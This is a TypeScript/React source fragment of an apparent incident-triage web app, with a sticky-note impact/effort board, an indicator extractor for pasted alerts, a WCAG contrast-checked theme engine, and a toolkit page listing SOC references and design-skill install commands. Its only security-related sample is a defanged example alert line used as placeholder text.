 const dumpIt=()=>{const L=dump.split(/\r?\n/).map((x:string)=>x.replace(/^\s*(?:[-*•]|\d+[.)])\s*/,'').trim()).filter(Boolean).map((x:string)=>x.slice(0,60));const seen:any={};notes.forEach((n:Note)=>{seen[n.t.toLowerCase()]=1});const U=L.filter((x:string)=>{const k=x.toLowerCase();if(seen[k])return false;seen[k]=1;return true}).slice(0,30);
   if(!U.length){setMsg('Nothing new to add. Paste one line per sticky.');return}
   const cols=6;const base=Date.now();const add2:Note[]=U.map((t:string,i:number)=>({id:base+i,t,x:8+(i%cols)*14+((Math.floor(i/cols))%2)*4,y:10+Math.floor(i/cols)*15,col:SV[i%6],shape:'sq',votes:0,cm:[]}));
   commit([...notes,...add2]);setDump('');setMsg(U.length+' lines dropped on the board'+(L.length>U.length?' ('+(L.length-U.length)+' skipped: duplicates or over 30)':'')+'. Drag each into place.')};
 const selN=notes.find((n:Note)=>n.id===sel);
 const patch=(p:any)=>{if(selN)commit(notes.map((n:Note)=>n.id===sel?{...n,...p}:n))};
 const remove=()=>{if(selN){commit(notes.filter((n:Note)=>n.id!==sel));setSel(null);setMsg('Sticky removed')}};
 const comment=()=>{if(selN&&cm.trim()){patch({cm:[...selN.cm,cm.trim()]});setCm('')}};
 const toPrd=()=>{const r=[...s.actions];notes.forEach((n:Note)=>{if(n.shape!=='emo'&&!r.some((q:any)=>q.t===n.t))r.push({t:n.t,b:BUCKET[quad(n)]})});up({actions:r});setMsg('Stickies added to the case as response actions')};
 const extract=()=>{const r=extractIocs(dump);setIocs(r);setMsg(r.length?r.length+' indicators found. Check each one.':'No indicators found. Try pasting more of the raw alert.')};
 const addIoc=(xs:any[])=>{const have=s.evidence.map((e:any)=>e.t.toLowerCase());const n=xs.filter((x:any)=>!have.includes(x.t.toLowerCase()));if(!n.length){setMsg('Already in the evidence list.');return}up({evidence:[...s.evidence,...n.map((x:any)=>({k:'IOC',t:x.t,g:'alert dump'}))]});setMsg(n.length+' added to the case evidence. Edit the source if you know it.')};
 const loadEx=()=>{commit(EX.map((e:any,i:number)=>({id:Date.now()+i,t:e.t,x:e.x,y:e.y,col:SV[i%6],shape:'sq',votes:e.votes,cm:e.cm})));setTitle('Which response comes first?');setSel(null);setMsg('Example loaded. Drag any sticky and watch the quadrant name update.')};
 const counts=[0,1,2,3].map((i:number)=>notes.filter((n:Note)=>quad(n)===i).length);
 const cur=step>0?TOUR[step-1]:null;const tg=(k:string)=>!!cur&&cur.k===k;
 const frames=['Overview','Contain now · do first','Plan the fix','Tidy up','Accept risk'];
 if(fr!==null)return <div className="frame"><div className="row" style={{justifyContent:'space-between'}}><b>{frames[fr]} · {fr+1}/5</b><button className="b" onClick={()=>setFr(null)}>close</button></div>
   <h2 style={{marginTop:16}}>{fr===0?title:frames[fr]}</h2>
   {fr===0?<Board notes={notes} sel={null} onSel={()=>{}} onCommit={()=>{}} grid dragRef={dragRef}/>:
   notes.filter((n:Note)=>quad(n)===fr-1).map((n:Note)=><div className="hot" key={n.id}><b>{n.t}</b><div className="s">{n.votes} votes · {n.cm.length} comments</div>{n.cm.map((c:string,i:number)=><div className="w" key={i}>{c}</div>)}</div>)}
   <div className="row" style={{marginTop:16}}><button className="b" disabled={fr===0} onClick={()=>setFr(fr-1)}>previous</button><button className="b pk" disabled={fr===4} onClick={()=>setFr(fr+1)}>next</button></div></div>;
 return <div className="matrix">
   <h1>triage matrix</h1>
   <p className="lead">Impact against response effort. Start in the top left, where impact is high and effort is low.</p>
   <div className="row" style={{marginBottom:8}}><span className="s" role="status" aria-live="polite">{msg||(shared?'shared board is live':'drag stickies, or try the example')}</span></div>
   <div className={'card'+(tg('title')?' tgt-on':'')}><label>question you are answering</label><input value={title} onChange={e=>setTitle(e.target.value)} aria-label="decision title"/>
     <div className="row" style={{marginTop:12}}><button className="b pk" onClick={loadEx}>load example</button><button className="b" onClick={()=>setFr(0)}>present</button><button className="b" onClick={()=>setStep(1)}>{step?'restart tour':'take the tour'}</button><Hold label="clear board" onDone={()=>{commit([]);setSel(null);setMsg('Board cleared')}}/></div></div>
   <div className="card"><h2>Alert dump</h2><p className="s">Paste a raw alert or log lines. Extract indicators to add as evidence, or drop each line on the board as a sticky. Extraction is pattern based, so check every result. Do not paste credentials or personal data.</p><textarea aria-label="alert dump" rows={5} value={dump} onChange={e=>setDump(e.target.value)} placeholder={'src=203.0.113.50 user=svc-backup url=hxxp://bad[.]example/update.ps1\nsha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'} style={{width:'100%',padding:'8px 12px',borderRadius:12,border:'2px solid var(--ink)',background:'var(--card)',resize:'vertical'}}/><div className="row" style={{marginTop:8}}><button className="b pk" disabled={!dump.trim()} onClick={extract}>extract indicators</button><button className="b" disabled={!dump.trim()} onClick={dumpIt}>drop lines on board</button><span className="s">{dump.split(/\r?\n/).filter((x:string)=>x.trim()).length} lines</span></div>{iocs.length>0&&<div style={{marginTop:8}}><div className="row" style={{justifyContent:'space-between'}}><b>{iocs.length} indicators</b><button className="b te" onClick={()=>addIoc(iocs)}>add all to evidence</button></div>{iocs.map((x:any)=><div className="prow" key={x.k+x.t}><span className="pn">{x.k}</span><code style={{flex:1,minWidth:0}}>{dfg(x.t)}</code><span className="s">{x.note}</span><button className="b" aria-label={'add '+x.t} onClick={()=>addIoc([x])}>add</button></div>)}</div>}</div>
   <div className="card"><div className="row" style={{justifyContent:'space-between',marginBottom:12}}><h2>{title}</h2><span className="s">{notes.length} stickies</span></div>
     <div className="row" style={{marginBottom:12}}>{QL.map((q:string,i:number)=><span key={q} className="pill">{q} · {counts[i]}</span>)}</div>
     <Board notes={notes} sel={sel} onSel={setSel} onCommit={commit} grid={grid} snap={snap} dragRef={dragRef} tgt={tg('board')}/>
     <div className="row" style={{marginTop:12}}><input style={{flex:1,minWidth:150}} value={txt} placeholder="new sticky, then press enter" onChange={e=>setTxt(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')add(txt,shape)}}/><select style={{width:110}} value={shape} onChange={e=>setShape(e.target.value)}><option value="sq">square</option><option value="round">round</option></select><button className="b te" onClick={()=>add(txt,shape)}>add</button></div>
     <div className="row" style={{marginTop:8}}>{SV.map((c:string)=><span key={c} role="button" aria-label={'color '+c} onClick={()=>setCol(c)} style={{width:24,height:24,borderRadius:6,background:c,border:col===c?'3px solid var(--tx)':'1px solid #8886',cursor:'pointer'}}/>)}{['🔥','💡','⚠️','✅','🚀'].map((e:string)=><span key={e} role="button" aria-label={'add '+e} style={{fontSize:22,cursor:'pointer'}} onClick={()=>add(e,'emo')}>{e}</span>)}<span className={'chip '+(grid?'on':'')} onClick={()=>setGrid(!grid)}>grid</span><span className={'chip '+(snap?'on':'')} onClick={()=>setSnap(!snap)}>snap</span></div>
     <p className="s" style={{marginTop:8}}>tip: drag, or click a sticky and use the arrow keys. shift makes bigger steps.</p></div>
   {selN&&<div className={'card'+(tg('detail')?' tgt-on':'')}><div className="row" style={{justifyContent:'space-between'}}><b>{selN.t}</b><span className="s">{QL[quad(selN)]}</span></div>
     <div className="row" style={{marginTop:8}}><button className="b" onClick={()=>patch({votes:selN.votes+1})}>👍 confidence vote ({selN.votes})</button><button className="b" onClick={()=>patch({shape:selN.shape==='round'?'sq':'round'})}>toggle shape</button><button className="b" onClick={()=>up({actions:[...s.actions,{t:selN.t,b:BUCKET[quad(selN)]}]})}>→ response action</button><button className="b" onClick={remove}>remove</button></div>
     {selN.cm.map((c:string,i:number)=><div className="w" key={i}>💬 {c}</div>)}
     <div className="row" style={{marginTop:8}}><input style={{flex:1}} value={cm} placeholder="comment or question" onChange={e=>setCm(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')comment()}}/><button className="b te" onClick={comment}>post</button></div></div>}
   {cur&&<div className="card tour" role="dialog" aria-label="guided tour"><div className="s">step {step} of 4</div><h2>{cur.t}</h2><p className="lead" style={{fontSize:16}}>{cur.b}</p>
     <div className="row"><button className="b" disabled={step<=1} onClick={()=>setStep(step-1)}>back</button>{step<4?<button className="b pk" onClick={()=>setStep(step+1)}>next</button>:<button className="b pk" onClick={()=>{setStep(0);setMsg('Tour complete. Try the example to see it in use.')}}>done</button>}<button className="b" onClick={()=>setStep(0)}>skip tour</button></div></div>}
   <div className={'card'+(tg('plan')?' tgt-on':'')}><h2>plan next steps</h2><p className="s">contain now is where you start. accept risk is where you write down what you are choosing not to chase.</p>
     <div className="row"><button className="b pk" onClick={toPrd}>send all stickies to the case</button><button className="b" onClick={()=>go('case')}>open case</button></div></div>
   <div className="card"><h2>learn the method</h2>
     <div className="row">{TOUR.map((x:any,i:number)=><button key={x.k} className={'pill '+(step===i+1?'on':'')} onClick={()=>setStep(i+1)}>{x.t}</button>)}</div>
     <details open><summary>best practices</summary>
       <ol className="s" style={{lineHeight:1.7}}>
         <li><b>Name the question.</b> Frame one decision. Broad enough to invite argument, narrow enough to settle this shift.</li>
         <li><b>Plot impact and effort.</b> Place each response option. If cost or downtime matters more than effort, relabel the axes in your head and keep the board.</li>
         <li><b>Weigh the options.</b> Ask people to comment and vote. Move stickies as the discussion sharpens them.</li>
         <li><b>Turn it into actions.</b> Start with the top left. Send those stickies to the case as response actions, then re-check the board after each change.</li>
       </ol></details>
     <details><summary>mistakes to avoid</summary>
       <ul className="s" style={{lineHeight:1.7}}>
         <li>Vague axes. Write down exactly what impact and effort mean for your team.</li>
         <li>One voice only. Invite the people who will run the response: identity, endpoint, network.</li>
         <li>Treating the ranking as the decision. The matrix shows the trade-off, and the reasoning still needs to be written down.</li>
         <li>A stale board. Update it as you learn, or it misleads the next handover.</li>
       </ul></details></div>
   <p className="s">the shared board syncs stickies, votes and comments on the hosted link. quadrant names update as you drag.</p>
 </div>}

const ago=(t:number)=>{const m=Math.round((Date.now()-t)/60000);return m<1?'just now':m<60?m+' min ago':m<1440?Math.round(m/60)+' h ago':Math.round(m/1440)+' d ago'};
function Spark({hist}:any){if(hist.length<2)return <p className="s">save a second snapshot to see the trend.</p>;const W=300,H=90;const pts=hist.map((h:any,i:number)=>{const x=i/(hist.length-1)*W;const y=H-(h.pct/100)*H;return x.toFixed(1)+','+y.toFixed(1)}).join(' ');return <svg className="spark" viewBox={'0 0 '+W+' '+H} width="100%" role="img" aria-label="readiness over time"><polyline pathLength="1" fill="none" stroke="var(--acc,currentColor)" strokeWidth="3" strokeLinejoin="round" strokeLinecap="round" points={pts}/></svg>}
function History({s,up,cur}:any){const H:any[]=s.hist||[];const recent=H.slice(-6).reverse();
return <div className="card"><h2>case history</h2><p className="s">readiness is saved each time it changes. save a snapshot any time to mark a handover.</p><Spark hist={H}/>
<div className="row"><button className="b" onClick={()=>up({hist:[...H,{at:Date.now(),pct:cur.pct,frust:cur.frust,ctrl:cur.ctrl,must:cur.must}].slice(-30)})}>save snapshot now</button>{H.length>0&&<Hold label="clear history" onDone={()=>up({hist:[]})}/>}</div>
{recent.map((h:any,i:number)=>{const idx=H.length-1-i;const prev=H[idx-1];const d=prev?h.pct-prev.pct:0;return <div className="prow" key={h.at}><span className="pn">{h.pct}% ready</span><span className="s">{h.frust} findings · {h.must} contain</span><span className="s" style={{marginLeft:'auto'}}>{prev?(d>0?'+'+d:d<0?'\u2212'+Math.abs(d):'no change'):'start'} · {ago(h.at)}</span></div>})}
{H.length===0&&<p className="s">no history yet.</p>}</div>}

const PT:any={50:1.06,100:1.18,200:1.42,300:1.85,400:2.55,500:3.3,600:4.8,700:7.5,800:10.5,900:14,950:17.5};
const PK:any={50:.25,100:.4,200:.6,300:.8,400:.95,500:1,600:1,700:.9,800:.75,900:.6,950:.45};
const lin=(c:number)=>c<=0.04045?c/12.92:((c+0.055)/1.055)**2.4;const gam=(c:number)=>c<=0.0031308?12.92*c:1.055*c**(1/2.4)-0.055;
const lum=(r:number[])=>0.2126*lin(r[0]/255)+0.7152*lin(r[1]/255)+0.0722*lin(r[2]/255);
const cr=(a:number[],b:number[])=>{const x=lum(a),y=lum(b);return(Math.max(x,y)+.05)/(Math.min(x,y)+.05)};
const okToLin=(L:number,C:number,H:number)=>{const h=H*Math.PI/180,a=C*Math.cos(h),b=C*Math.sin(h);const l=(L+.3963377774*a+.2158037573*b)**3,m=(L-.1055613458*a-.0638541728*b)**3,s=(L-.0894841775*a-1.291485548*b)**3;return[4.0767416621*l-3.3077115913*m+.2309699292*s,-1.2684380046*l+2.6097574011*m-.3413193965*s,-.0041960863*l-.7034186147*m+1.707614701*s]};
const rgbToOk=(rgb:number[])=>{const[r,g,b]=rgb.map(v=>lin(v/255));const l=Math.cbrt(.4122214708*r+.5363031299*g+.0514459929*b),m=Math.cbrt(.2119034982*r+.6806995451*g+.1073969566*b),s=Math.cbrt(.0883024619*r+.2817188376*g+.6299787005*b);const A=1.9779984951*l-2.428592205*m+.4505937099*s,B=.0259040371*l+.7827717662*m-.808675766*s;return[.2104542553*l+.793617785*m-.0040720468*s,Math.hypot(A,B),(Math.atan2(B,A)*180/Math.PI+360)%360]};
const inG=(v:number[])=>v.every(x=>x>=-1e-4&&x<=1+1e-4);
const toRgb=(L:number,C:number,H:number)=>{let c=C;while(c>0&&!inG(okToLin(L,c,H)))c-=.002;return okToLin(L,Math.max(c,0),H).map(v=>Math.round(Math.min(1,Math.max(0,gam(Math.min(1,Math.max(0,v)))))*255))};
const pstep=(base:number[],s:number)=>{let[,C,H]=rgbToOk(base);C=C<.02?0:C*PK[s];const Wt=[255,255,255];let lo=0,hi=1;for(let i=0;i<40;i++){const m=(lo+hi)/2;if(cr(toRgb(m,C,H),Wt)>=PT[s])lo=m;else hi=m}let L=lo,rgb=toRgb(L,C,H);while(cr(rgb,Wt)<PT[s]){L-=.0005;rgb=toRgb(L,C,H)}return rgb};
const h2r=(h:string)=>{h=h.replace('#','');if(h.length===3)h=h.split('').map(c=>c+c).join('');return[0,2,4].map(i=>parseInt(h.slice(i,i+2),16))};
const r2h=(r:number[])=>'#'+r.map(v=>v.toString(16).padStart(2,'0')).join('').toUpperCase();
const SC:any={};const mkScale=(hex:string)=>{if(SC[hex])return SC[hex];const b=h2r(hex),o:any={};Object.keys(PT).forEach(k=>{o[k]=r2h(pstep(b,+k))});SC[hex]=o;return o};
const C2=(a:string,b:string)=>cr(h2r(a),h2r(b));const fl=(x:number)=>(Math.floor(x*100)/100).toFixed(2);const lv=(v:number)=>v>=7?'AAA':v>=4.5?'AA':v>=3?'AA large':'fail';
const NEU=mkScale('#737373');
const PRE_T:any={graphite:['Graphite','#3F3F46'],ultramarine:['Ultramarine','#3B6CF0'],signal:['Signal','#E8452C'],moss:['Moss','#2F8F6B'],marigold:['Marigold','#D99A00'],orchid:['Orchid','#B04FD1']};
function toks(A:any,S:any,dark:boolean){return dark?{surface:S[950],text:S[50],sec:S[300],muted:S[900],acc:A[400],onacc:A[950],hov:A[300],accsub:A[900],acct:A[400],bord:A[500],focus:A[400]}:{surface:'#FFFFFF',text:S[950],sec:S[700],muted:S[50],acc:A[600],onacc:'#FFFFFF',hov:A[700],accsub:A[50],acct:A[600],bord:A[500],focus:A[600]}}
function pairs(t:any){const R:any[]=[['text/primary','bg/surface',t.text,t.surface,7,0],['text/primary','bg/muted',t.text,t.muted,7,0],['text/secondary','bg/surface',t.sec,t.surface,7,0],['text/on-accent','bg/accent',t.onacc,t.acc,4.5,0],['text/on-accent','bg/accent-hover',t.onacc,t.hov,4.5,0],['text/accent','bg/surface',t.acct,t.surface,4.5,0],['text/accent','bg/accent-subtle',t.acct,t.accsub,4.5,0],['border/interactive','bg/surface',t.bord,t.surface,3,1],['focus/ring','bg/surface',t.focus,t.surface,3,1]];return R.map((r:any)=>{const v=C2(r[2],r[3]);return{a:r[0],b:r[1],v,ok:v>=r[4],lvl:r[5]?(v>=3?'UI ✓':'UI fail'):lv(v)}})}
const gmin=(fg:string,a:string,b:string)=>{const A=h2r(a),B=h2r(b),F=h2r(fg);let m=99;for(let i=0;i<=10;i++){const t=i/10;m=Math.min(m,cr(F,A.map((v,k)=>Math.round(v+(B[k]-v)*t))))}return m};
function grads(A:any,S:any,dark:boolean){const mk=(n:string,p:string,a:string,b:string,fg:string,min:number,rad?:boolean)=>({n,p,a,b,fg,min,v:gmin(fg,a,b),css:rad?`radial-gradient(120% 100% at 50% 0%,${a},${b})`:`linear-gradient(135deg,${a},${b})`});
return dark?[mk('cta','primary button fill: same hue, two stops, no rainbow',A[400],A[300],A[950],4.5),mk('stage','3d stage wash: neutral, sits behind the mascot',S[900],S[950],S[50],7,true),mk('deep band','ticker band: dark tonal step of the accent',A[900],A[800],S[50],7)]:[mk('cta','primary button fill: same hue, two stops, no rainbow',A[600],A[700],'#FFFFFF',4.5),mk('stage','3d stage wash: neutral, sits behind the mascot',S[50],S[200],S[950],7,true),mk('deep band','ticker band: dark tonal step of the accent',A[950],A[800],'#FFFFFF',7)]}
function useTheme():[any,(t:any)=>void]{const [th,set]=useState<any>(()=>{try{return JSON.parse(localStorage.getItem('spec-th')||'')}catch(e){return{id:'graphite',mode:'system',custom:''}}});const [sys,setSys]=useState(()=>window.matchMedia('(prefers-color-scheme:dark)').matches);
useEffect(()=>{const m=window.matchMedia('(prefers-color-scheme:dark)');const f=()=>setSys(m.matches);m.addEventListener('change',f);return()=>m.removeEventListener('change',f)},[]);
useEffect(()=>{try{localStorage.setItem('spec-th',JSON.stringify(th))}catch(e){}const dark=th.mode==='dark'||(th.mode==='system'&&sys);const ok=/^#?[0-9a-f]{6}$/i.test(th.custom||'');const hex=ok?'#'+th.custom.replace('#','').toUpperCase():(PRE_T[th.id]||PRE_T.graphite)[1];const A=mkScale(hex),t=toks(A,NEU,dark),g=grads(A,NEU,dark);const r=document.documentElement.style;
[['--bg',t.surface],['--card',t.surface],['--tx',t.text],['--mu',t.sec],['--ink',t.text],['--ye',t.muted],['--pk',t.acc],['--acc',t.acc],['--onacc',t.onacc],['--acct',t.acct],['--focus',t.focus],['--cta',g[0].css],['--stagebg',g[1].css],['--deep',g[2].css],['--deepfg',g[2].fg]].forEach((x:any)=>r.setProperty(x[0],x[1]));r.setProperty('color-scheme',dark?'dark':'light')},[th,sys]);return[th,set]}
function ThemePage({th,setTh}:any){const mq=window.matchMedia('(prefers-color-scheme:dark)').matches;const dark=th.mode==='dark'||(th.mode==='system'&&mq);const ok=/^#?[0-9a-f]{6}$/i.test(th.custom||'');const hex=ok?'#'+th.custom.replace('#','').toUpperCase():(PRE_T[th.id]||PRE_T.graphite)[1];const A=mkScale(hex),t=toks(A,NEU,dark),P=pairs(t),G=grads(A,NEU,dark);const bad=P.filter((c:any)=>!c.ok).length+G.filter((g:any)=>g.v<g.min).length;
return <div><h1>theme</h1><p className="lead">six palettes from one wcag engine. every pass below is calculated on the final hex values, then applied to this whole site.</p>
<div className="row" style={{gap:20,marginTop:'24px'}}>{Object.keys(PRE_T).map(k=><span key={k} className={'chip '+(!ok&&th.id===k?'on':'')} onClick={()=>setTh({...th,id:k,custom:''})}><i className="dot" style={{background:PRE_T[k][1]}}/>{PRE_T[k][0].toLowerCase()}</span>)}</div>
<div className="row" style={{gap:20}}><input style={{maxWidth:160}} placeholder="custom hex" value={th.custom||''} onChange={e=>setTh({...th,custom:e.target.value})}/>{['system','light','dark'].map(m=><span key={m} className={'chip '+(th.mode===m?'on':'')} onClick={()=>setTh({...th,mode:m})}>{m}</span>)}</div>
<p className="s">standard: wcag 2.2 (w3c recommendation, ed. 12.12.2024). version check was not performed in this run; baseline last verified 15.09.2026. {P.length+G.length} checks, failures: {bad}.</p>
<h2 style={{marginTop:'48px'}}>{hex} scale</h2><div className="sc">{Object.keys(A).map(k=>{const w=C2(A[k],'#FFFFFF'),b=C2(A[k],'#000000');const fg=w>=b?'#FFFFFF':'#000000';return <div key={k} style={{background:A[k],color:fg,border:(k==='50'||k==='100')?'1px solid #D8D8D8':'1px solid transparent'}}><b>{k}</b><span>{A[k]}</span><span>white {fl(w)}</span><span>black {fl(b)}</span><span>{fg==='#FFFFFF'?'white':'black'} text, {lv(Math.max(w,b))}</span></div>})}</div>
<h2 style={{marginTop:'48px'}}>tokens, {dark?'dark':'light'}</h2>{P.map((c:any)=><div className="trow" key={c.a+c.b}><span>{c.a}</span><span>on {c.b}</span><span>{fl(c.v)}:1 · {c.lvl}</span></div>)}
<h2 style={{marginTop:'48px'}}>gradients</h2><div className="gr">{G.map((g:any)=><div key={g.n}><div className="gp" style={{background:g.css,color:g.fg}}><b>{g.n}</b><span>sample text on gradient</span></div><p className="s"><b>{g.n}</b>: {g.p}<br/>{g.a} → {g.b} · lowest contrast {fl(g.v)}:1 · {g.v>=g.min?'✓ pass ('+g.min+':1)':'✕ fail'}</p></div>)}</div>
<p className="s" style={{marginTop:'48px'}}>disabled states are exempt from contrast rules. never use color alone to carry meaning. contrast is one part of accessibility; test keyboard focus, target sizes, labels and reading order separately.</p></div>}


const TK_SOC:string[][]=[
['MITRE ATT&CK','Knowledge base','Tactics and techniques seen in real intrusions. The tactic list in this app comes from it.','https://attack.mitre.org/'],
['Sigma','Detection rules','A generic rule format for log detections, convertible to many SIEMs.','https://github.com/SigmaHQ/sigma'],
['Wazuh','Open-source XDR and SIEM','Agent-based detection and response. Its rules are a common source of alerts to triage.','https://wazuh.com/'],
['Atomic Red Team','Testing','Small, mapped tests to check whether your detections fire.','https://github.com/redcanaryco/atomic-red-team'],
['CISA KEV catalog','Vulnerabilities','Vulnerabilities known to be exploited in the wild.','https://www.cisa.gov/known-exploited-vulnerabilities-catalog'],
['NIST SP 800-61','Incident handling','NIST guidance on preparing for and handling security incidents.','https://csrc.nist.gov/pubs/sp/800/61/r3/final'],
['CyberChef','Decoding','Decode, decompress and transform data in the browser. Handy for encoded PowerShell.','https://gchq.github.io/CyberChef/']];
const TK_SKILLS:string[][]=[["emil-design-eng", "Animation + design craft", "Core Emil Kowalski skill: easing, durations, press states, what not to animate.", "npx skills add emilkowalski/skill"], ["animate", "Animation", "Builds an animation from scratch: picks curve, duration and properties.", "npx skills add emilkowalski/skill"], ["animate-expo", "Animation \u00b7 React Native", "Same bar for Expo: gestures, sheets, haptics, motion off the JS thread.", "npx skills add emilkowalski/skill"], ["review-animations", "Review", "Strict review of your animations against Emil's rules.", "npx skills add emilkowalski/skill"], ["improve-animations", "Audit", "Audits every animation in a codebase and returns prioritized plans.", "npx skills add emilkowalski/skill"], ["find-animation-opportunities", "Discovery", "Finds where motion helps, and what not to animate.", "npx skills add emilkowalski/skill"], ["animation-performance", "Performance", "Fixes dropped frames and the subtle issues agents miss.", "npx skills add emilkowalski/skill"], ["animation-vocabulary", "Prompting", "The right words to tell an AI exactly what motion you want.", "npx skills add emilkowalski/skill"], ["apple-design", "Principles", "Apple's interface and fluid-motion principles, translated for the web.", "npx skills add emilkowalski/skill"], ["write-swift", "Code", "Modern Swift: value types, Swift 6 concurrency, generics, Swift Testing.", "npx skills add emilkowalski/skill"], ["pick-ui-library", "Libraries", "Picks a trusted library instead of hand-rolling a toast or adding an abandoned package.", "npx skills add emilkowalski/skill"], ["prototype", "Exploration", "Builds several versions of a UI piece with a switcher to compare.", "npx skills add emilkowalski/skill"], ["mobile-native", "Mobile", "Sticky hover, tap flashes, 100vh bug, zooming inputs, laggy taps, safe areas.", "npx skills add emilkowalski/skill"], ["break-ui", "QA", "Tries to break your UI with long names, odd emails, huge counts and empty lists.", "npx skills add emilkowalski/skill"], ["ask-sonner", "Library guide", "Setup, styling and fixes for the Sonner toast library.", "npx skills add emilkowalski/skill"]];
const TK_OTHER:string[][]=[
['taste-skill','Art direction','Open-source skill (Leonxlnx) that pushes agents toward distinct visual character and checks the result in a browser. Not to be confused with taste-skill.dev, which I could not verify.','npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend"','https://github.com/leonxlnx/taste-skill'],
['impeccable','Design vocabulary','Commands like critique, audit, polish, harden, animate, plus a slop detector.','npx impeccable install','https://github.com/pbakaus/impeccable'],
['awesome-design-md','DESIGN.md library','Ready-made DESIGN.md files extracted from real brands. Drop one in, tell your agent to use it.','','https://github.com/VoltAgent/awesome-design-md'],
['aiforui.dev','Course','Emil Kowalski\'s course with the fuller skill set behind the free skill file.','','https://aiforui.dev/']];
function copyText(t:string,done:(m:string)=>void){try{navigator.clipboard.writeText(t).then(()=>done('Copied'),()=>done('Select and copy manually'))}catch(e){done('Select and copy manually')}}
function Cmd({c}:any){const [m,setM]=useState('Copy');return <div className="tk-cmd"><code>{c}</code><button className="b" aria-label={'Copy '+c} onClick={()=>copyText(c,x=>{setM(x);setTimeout(()=>setM('Copy'),1500)})}>{m}</button></div>}
function Toolkit({s}:any){const [m,setM]=useState('');
 const brief=()=>{const t='# DESIGN.md (starter)\n\nProduct: '+(s.name||'Untitled')+'\nGoal: '+(s.goal||'-')+'\nProblem: '+(s.problem||'-')+'\n\n## Rules for the agent\n- Warm, bold, playful: thick ink borders, hard offset shadows, pink/yellow/teal on cream.\n- Motion: custom ease-out curve, press scale .97, under 300ms, transform and opacity only.\n- Hover effects only under (hover:hover) and (pointer:fine).\n- Test with worst-case data: long names, empty lists, huge counts.\n- Respect prefers-reduced-motion: keep fades, drop movement.\n';copyText(t,x=>{setM(x==='Copied'?'Agent brief copied':x);setTimeout(()=>setM(''),2000)})};
 return <div><h1>Toolkit</h1><p className="s">The design skills and resources behind this app's polish. Install them in your own coding agent. Nothing here runs inside Spectacle SOC.</p>
 <div className="card"><h2>Copy as agent brief</h2><p className="s">Turns your current case into a starter DESIGN.md for any coding agent.</p><button className="b pk" onClick={brief}>Copy brief</button> <span className="s" role="status" aria-live="polite">{m}</span></div>
 <h2 className="tk-sec">SOC references</h2><p className="s">External tools and references for the analyst workflow.</p><div className="tk-grid">{TK_SOC.map((k:string[])=><div className="card" key={k[0]}><span className="tk-tag">{k[1]}</span><h3 style={{margin:0}}>{k[0]}</h3><p className="s" style={{margin:0}}>{k[2]}</p><a href={k[3]} target="_blank" rel="noopener noreferrer">{k[3].replace('https://','')}</a></div>)}</div>
 <h2 className="tk-sec">Emil Kowalski skills ({TK_SKILLS.length})</h2><p className="s">All installed together with one command.</p><Cmd c="npx skills add emilkowalski/skill"/>
 <div className="tk-grid" style={{marginTop:12}}>{TK_SKILLS.map(k=><div className="card" key={k[0]}><span className="tk-tag">{k[1]}</span><h3 style={{margin:0}}>{k[0]}</h3><p className="s" style={{margin:0}}>{k[2]}</p></div>)}</div>
 <h2 className="tk-sec">More resources</h2>
 <div className="tk-grid">{TK_OTHER.map(k=><div className="card" key={k[0]}><span className="tk-tag">{k[1]}</span><h3 style={{margin:0}}>{k[0]}</h3><p className="s" style={{margin:0}}>{k[2]}</p>{k[3]?<Cmd c={k[3]}/>:null}<a href={k[4]} target="_blank" rel="noopener noreferrer">{k[4].replace('https://','')}</a></div>)}</div><DesignMd/></div>}

const DM_BRANDS:any={"AI & LLM": [["Claude", "Warm terracotta accent, clean editorial layout"], ["Cohere", "Vibrant gradients, data-rich dashboard"], ["ElevenLabs", "Dark cinematic UI, waveform aesthetics"], ["Mistral AI", "French-engineered minimalism, purple-toned"], ["Ollama", "Terminal-first, monochrome simplicity"], ["Replicate", "Clean white canvas, code-forward"], ["Runway", "Editorial film-festival look, pure black pill CTAs"], ["VoltAgent", "Void-black canvas, emerald accent, terminal-native"], ["xAI", "Stark monochrome, futuristic minimalism"]], "Dev tools": [["Cursor", "Sleek dark interface, gradient accents"], ["Expo", "Dark theme, tight letter-spacing, code-centric"], ["Lovable", "Playful gradients, friendly dev aesthetic"], ["Raycast", "Dark chrome, vibrant gradient accents"], ["Superhuman", "Premium dark UI, keyboard-first, purple glow"], ["Vercel", "Black and white precision, Geist font"], ["Warp", "Dark IDE-like, block-based command UI"]], "Backend & data": [["ClickHouse", "Yellow-accented, technical documentation style"], ["MongoDB", "Green leaf branding, docs focus"], ["PostHog", "Playful hedgehog branding, developer-friendly dark UI"], ["Sentry", "Dark data-dense dashboard, pink-purple accent"], ["Supabase", "Dark emerald theme, code-first"], ["HashiCorp", "Enterprise-clean, black and white"]], "Productivity": [["Linear", "Ultra-minimal, precise, purple accent"], ["Notion", "Warm minimalism, serif headings, soft surfaces"], ["Cal.com", "Clean neutral UI, developer simplicity"], ["Mintlify", "Clean, green-accented, reading-optimized"], ["Resend", "Minimal dark theme, monospace accents"], ["Zapier", "Warm orange, illustration-driven"], ["Intercom", "Friendly blue palette, conversational UI"]], "Design tools": [["Figma", "Vibrant multi-color, playful yet professional"], ["Framer", "Bold black and blue, motion-first"], ["Miro", "Bright yellow accent, infinite canvas"], ["Airtable", "Colorful, friendly, structured data"], ["Webflow", "Blue-accented, polished marketing site"]], "Fintech": [["Stripe", "Signature purple gradients, weight-300 elegance"], ["Wise", "Bright green accent, friendly and clear"], ["Revolut", "Sleek dark, gradient cards"], ["Coinbase", "Clean blue identity, trust-focused"], ["Mercury", "Ink-violet night world, indigo action pill"], ["Kraken", "Purple-accented dark, data-dense"]], "Media & consumer": [["Apple", "Premium white space, SF Pro, cinematic imagery"], ["Spotify", "Vibrant green on dark, bold type"], ["Airbnb", "Warm coral accent, photography-driven"], ["Nike", "Monochrome UI, massive uppercase type"], ["Pinterest", "Red accent, masonry grid, image-first"], ["WIRED", "Paper-white broadsheet density, custom serif"], ["Tesla", "Radical subtraction, full-viewport photography"], ["NVIDIA", "Green-black energy, technical power"]]};
